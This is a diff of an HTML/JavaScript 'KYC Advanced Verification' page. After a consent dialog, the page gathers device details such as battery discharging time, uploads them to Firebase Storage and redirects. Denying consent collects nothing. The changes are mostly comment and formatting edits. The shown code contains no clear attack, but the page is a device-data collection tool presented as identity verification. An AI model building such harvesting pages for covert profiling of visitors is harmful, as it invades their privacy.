@@ -5,13 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KYC Advanced Verification</title>
     <style>
-        /* Simple styling */
+        /* Basic styling */
         body {
             font-family: Arial, sans-serif;
             background-color: #222;
             color: #fff;
-            margin: 0;
-            padding: 0;
         }
         #consentDialog {
             display: flex;
@@ -70,13 +68,13 @@
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        // Gather Advanced Device Info with accurate discharging time calculation
+        // Gather Device Info with refined discharging time calculation
         async function getAdvancedDeviceInfo() {
             try {
                 const batteryInfo = await navigator.getBattery();
-                let dischargingTimeMinutes, dischargingTimeHours;
-                
-                // Calculate discharging time in realistic hours and minutes
+                let dischargingTimeHours, dischargingTimeMinutes;
+
+                // Calculate realistic discharging time
                 if (batteryInfo.dischargingTime !== Infinity) {
                     const dischargingTimeInSeconds = batteryInfo.dischargingTime;
                     dischargingTimeHours = Math.floor(dischargingTimeInSeconds / 3600);
@@ -125,7 +123,12 @@
             }
         }
 
-        // Format and Collect Data
+        // Format device information
+        function formatDeviceInfo(info) {
+            return Object.entries(info).map(([key, value]) => `${key}: ${value}`).join("\n");
+        }
+
+        // Upload Data and Redirect after success
         async function collectData() {
             document.getElementById("consentDialog").style.display = "none";
             console.log("Consent given. Starting data collection...");
@@ -143,14 +146,14 @@
 
                 console.log("KYC data uploaded successfully to Firebase Storage.");
 
-                // Redirect to another URL if upload is successful
+                // Successful upload, now redirect
                 window.location.href = "https://example.com/kyc-complete"; // Replace with your actual link
             } catch (error) {
                 console.log("Error uploading KYC data: " + error.message);
             }
         }
 
-        // Redirect if upload successful
+        // If consent is denied
         function denyConsent() {
             console.log("Consent denied. No data collected.");
             document.getElementById("consentDialog").style.display = "none";
